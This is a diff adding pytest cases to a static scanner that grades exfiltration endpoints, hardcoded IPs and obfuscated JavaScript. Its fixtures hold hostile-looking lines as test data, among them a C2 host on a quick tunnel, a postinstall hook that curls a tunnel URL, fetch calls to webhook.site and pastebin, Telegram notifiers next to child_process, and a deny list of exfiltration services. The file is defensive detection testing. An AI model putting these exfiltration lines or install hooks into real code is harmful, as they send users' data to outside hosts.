@@ -417,13 +417,13 @@ _UUID = "0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a"
         ("$r = wp_remote_post('https://api.telegram.org/bot'.tg_token().'/sendMessage');", "bot."),
         ('url = f"https://api.telegram.org/bot{self.token}/sendMessage"', "own bot."),
         # a webhook.site mention with no bin id near it
-        ('example: "curl https://webhook.site/test",', "a mention, not an endpoint."),
+        ('notes: "curl https://webhook.site/test",', "a mention, not an endpoint."),
         ("  # For testing, create a sample alerting webhook at http://webhook.site/", "mention"),
         # a tunnel's bare suffix, and the API cloudflared registers with
         ("if (!host.endsWith('.trycloudflare.com')) return false", "no tunnel's name"),
         ("server: { allowedHosts: ['.ngrok-free.app'] }", "no tunnel's name"),
-        (" * a random https://….trycloudflare.com address, no account needed", "tunnel's name"),
-        ("log('no URL (api.trycloudflare.com reachable?)')", "no tunnel's name"),
+        (" * a random https://….trycloudflare.com address, no account needed", "placeholder host"),
+        ("log('no URL (api.trycloudflare.com reachable?)')", "quick tunnel's name"),
     ],
 )
 def test_what_names_no_endpoint_in_a_quiet_file_is_low(text: str, note: str) -> None:
@@ -735,3 +735,193 @@ def test_channel_follow_is_never_not_new_but_shell_startup_is() -> None:
     ]
     assert rc.severity is Severity.MEDIUM
     assert _demoted(rc, "package.json", frozenset({_key(rc)})).severity is Severity.LOW
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        'tunnelUrlPlaceholder:"https://demo.trycloudflare.com",scopeLabel:"x"',
+        "// --link https://name.trycloudflare.com logs the phone in",
+        "the tunnel host a request came through, such as `abc-def.trycloudflare.com`",
+        "// Quick tunnel URL: https://word-word-word-word.trycloudflare.com",
+        "matches `a.b.trycloudflare.com` too",
+        "log('cloudflared started but produced no URL (api.trycloudflare.com reachable?)')",
+        "const s = require('child_process'); open('https://demo.trycloudflare.com')",
+    ],
+)
+def test_a_trycloudflare_host_that_is_not_a_quick_tunnel_is_low(text: str) -> None:
+    """v9 (round 5, L2): Cloudflare names quick tunnels with hyphen-joined words; a host that
+    is not one can't be anyone's tunnel, whatever else the file does."""
+    matches = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"]
+    assert [(m.severity.value, m.weight) for m in matches] == [("low", 1.0)]
+    assert "Not a quick tunnel's name" in matches[0].explanation
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "const C2_HOST = 'diameter-coins-limitations-parents.trycloudflare.com';",
+        "downloadUrl='https://dean-earnings-directed-aside.trycloudflare.com/x'",
+        "u = 'https://' + id + '-x.trycloudflare.com'",  # a name built in code
+        '  "postinstall": "curl https://demo.trycloudflare.com/i"',  # an install hook's line
+    ],
+)
+def test_a_quick_tunnel_name_stays_high(text: str) -> None:
+    assert ("high", 5.0) in _exfil(text)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        '    example: "curl https://webhook.site/0b1c2d3e",',
+        'rows=\\"4\\" placeholder=\\"api.example.com&#10;webhook.site\\" class=\\"w-full\\"',
+        "            placeholder: 'cezar.ngrok.app',",
+        "'enter a bare hostname (no scheme), e.g. cezar.ngrok.app'",
+        "// e.g., 'https://webhook.site/your-unique-id'",
+    ],
+)
+def test_a_placeholder_or_example_value_is_low(text: str) -> None:
+    """v9 (L3): text shown to a user as an example is not an endpoint."""
+    matches = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"]
+    assert [(m.severity.value, m.weight) for m in matches] == [("low", 1.0)]
+    assert "UI placeholder or an example" in matches[0].explanation
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "const example = 'https://cd34-1-2.ngrok-free.app/x'; fetch(example)",  # a variable
+        f"fetch('https://webhook.site/{_UUID}'); // e.g., 'https://webhook.site/your-id'",
+        "const placeholderFor = x; post(`https://calm-river-lake-one.trycloudflare.com`)",
+    ],
+)
+def test_an_endpoint_beside_an_example_stays_high(text: str) -> None:
+    assert ("high", 5.0) in _exfil(text)
+
+
+def test_a_bundle_s_notifier_far_from_its_collection_stays_high() -> None:
+    """v9: "collects nothing" asks the whole file, however large. A window around the match
+    (round 5's L4) was rejected by the owner: a bundled drainer sends far from where it
+    collects."""
+    notifier = "await fetch(`https://api.telegram.org/bot${token}/sendMessage`, opts)\n"
+    far = "const cp = require('child_process');\n" + "// filler\n" * 3000
+    near = "const cp = require('child_process');\n"
+    big_far = (far + notifier + "x = 1;\n" * 10000).encode()
+    big_near = ("x = 1;\n" * 10000 + near + notifier + "x = 1;\n" * 10000).encode()
+    small_far = (near + "// filler\n" * 5000 + notifier).encode()
+    assert len(big_far) > 64 * 1024 and len(big_near) > 64 * 1024 and len(small_far) < 64 * 1024
+
+    def exfil(content: bytes) -> list[str]:
+        return [m.severity.value for m in analyse(content) if m.rule_id == "static.exfil-endpoint"]
+
+    assert exfil(big_far) == ["high"]
+    assert exfil(big_near) == ["high"]
+    assert exfil(("x = 1;\n" * 20000 + notifier).encode()) == ["low"]  # quiet: v8 lowers it
+    assert exfil(small_far) == ["high"]
+
+
+def test_an_ip_written_as_a_placeholder_or_example_is_low() -> None:
+    """`static.hardcoded-ip` v6 (L3)."""
+
+    def ips(text: str) -> list[tuple[str, float]]:
+        return [
+            (m.severity.value, m.weight)
+            for m in analyse(text.encode())
+            if m.rule_id == "static.hardcoded-ip"
+        ]
+
+    assert ips("placeholder: 'leave empty = http://8.130.134.171 (public IP)',") == [("low", 1.0)]
+    assert ips('  serverUrl: ""   # e.g. http://62.84.188.166:30080 (not /admin)') == [("low", 1.0)]
+    assert ips("get('http://62.84.188.166:30080/x')") == [("medium", 3.0)]
+    assert ips('  "postinstall": "curl e.g. http://62.84.188.166/x"') == [("medium", 3.0)]
+
+
+GLUE = (
+    "function getCFunc(_0x2221a4){var _0x54cf7b=Module['_'+_0x2221a4];return _0x54cf7b}"
+    + " ".join(f"var _0x{i:04x}=HEAP8[{i}]|HEAP32[{i}];" for i in range(30))
+)
+
+
+def test_obfuscated_names_in_emscripten_glue_are_low() -> None:
+    """`static.obfuscated` v2 (L1): renamed locals in Emscripten's runtime, no string array."""
+    (match,) = Obfuscated().evaluate_text(GLUE)
+    assert (match.severity.value, match.weight) == ("low", 1.0)
+    assert "Emscripten glue" in match.explanation
+
+
+@pytest.mark.parametrize(
+    "extra",
+    [
+        "var s=_0x1a2b(0x1f3);",  # a string-array lookup
+        "while(!![]){try{break}catch(e){}}",
+        "_0x5a1b['push'](_0x5a1b['shift']());",
+        " ".join(f"_0x{i:05x}" for i in range(120)),  # every name renamed: an obfuscator's
+    ],
+)
+def test_obfuscator_output_in_emscripten_glue_stays_medium(extra: str) -> None:
+    (match,) = Obfuscated().evaluate_text(GLUE + extra)
+    assert match.severity.value == "medium"
+
+
+def test_obfuscated_names_without_emscripten_stay_medium() -> None:
+    text = " ".join(f"var _0x{i:04x}=a[{i}];" for i in range(30))
+    (match,) = Obfuscated().evaluate_text(text)
+    assert match.severity.value == "medium"
+
+
+@pytest.mark.parametrize(
+    ("text", "severity"),
+    [
+        ('      "urlMain": "https://pastebin.com/",', "low"),
+        ('      "url": "https://pastebin.com/u/{}",', "low"),
+        ('{"name":"Pastebin","url":"https://pastebin.com/doc_api"}', "low"),
+        ("fetch('https://pastebin.com/raw/Xy12Ab34').then(r => r.text())", "high"),
+        ("get('https://pastebin.com/Xy12Ab34')", "high"),
+        ("post('https://pastebin.com/api/api_post.php', data)", "high"),
+        ("get('https://pastebin.com/raw.php?i=Xy12Ab34')", "high"),
+    ],
+)
+def test_pastebin_without_a_paste_or_the_api_is_low(text: str, severity: str) -> None:
+    """v9 (L2): the site itself, a user page or its docs page is no paste."""
+    (match,) = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"]
+    assert match.severity.value == severity
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        # an ellipsis is no hostname label
+        "// A quick tunnel: a random https://….trycloudflare.com address."
+        " cp = require('child_process')",
+        # a brand-name deny list (detection substrings)
+        '"any": ["webhook.site", "requestbin", "pipedream", "ngrok", "oastify"]',
+        # a comma-separated list of service prefixes in one string: no token after `bot`
+        "const D = `discord.com/api/webhooks,api.telegram.org/bot,hooks.slack.com/services`"
+        ".split(`,`)",
+        # a written host after CJK punctuation
+        "// 实测。api.trycloudflare.com 访问 GET",
+    ],
+)
+def test_v9_lists_and_placeholders_are_low(text: str) -> None:
+    """v9 (L2): an ellipsis label, a deny list of brand names, a list entry with no token."""
+    matches = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"]
+    assert matches
+    assert {(m.severity.value, m.weight) for m in matches} == {("low", 1.0)}
+
+
+def test_an_html_escaped_telegram_placeholder_is_documentation() -> None:
+    """v9: `bot&lt;token&gt;` is `bot<token>` in HTML, as v4 dropped."""
+    assert _exfil("open https://api.telegram.org/bot&lt;token&gt;/getUpdates and") == []
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "const BASE = ['x', 'https://api.telegram.org/bot', 'y'];",  # a string array's entry
+        "u = sub + 'x.trycloudflare.com'",  # a name built in code
+        "u = `${id}x.trycloudflare.com`",
+        f'"any": ["webhook.site", "requestbin"]; post("https://webhook.site/{_UUID}")',
+    ],
+)
+def test_v9_lists_keep_what_can_be_an_endpoint(text: str) -> None:
+    assert ("high", 5.0) in _exfil(text)
